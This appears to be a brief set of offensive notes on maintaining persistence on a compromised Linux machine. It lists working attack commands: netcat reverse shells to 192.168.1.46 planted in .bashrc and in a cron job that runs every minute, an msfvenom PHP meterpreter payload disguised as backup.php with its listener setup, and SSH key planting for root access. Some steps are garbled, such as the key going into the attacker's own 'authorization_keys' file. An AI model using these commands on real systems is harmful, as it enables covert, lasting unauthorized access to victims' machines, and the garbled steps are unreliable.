# Linux Persistent

## Via ssh keys

   linux victim 
    · Ssh-keygen
    · /home/nooranet/.ssh/id_rsa.pub
    · Copy content of id_rsa.pub and add it  to /root/.ssh/authorization_keys of Attacker
    · Ssh root@victimIP

## Via .bashrc

    nano /home/nooranet/.bashrc
        * nc  -l  -p  1111
        * nc 192.168.1.46 443 -e /bin/bash

## Via web shell

    payload
        * msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.46 LPORT=443 -e php/base64 -f raw > /home/nooranet/Red/backup.php
    listener
        * Msfconsole 
        * Use multi/handler
        * Set payload php/meterpreter/reverse_tcp 
        * Set lhost 192.168.1.46
        * Set lport 443
        * Run -j 
    Download paylaod from victim 
        * Wget http://192.168.1.46/backup.php

## Via cron job

    Crontab -e 
        *  *  *  *  * nc 192.168.1.46 443 -e /bin/bash
        *  *  *  *  * php -f /var/www/html/backup.html
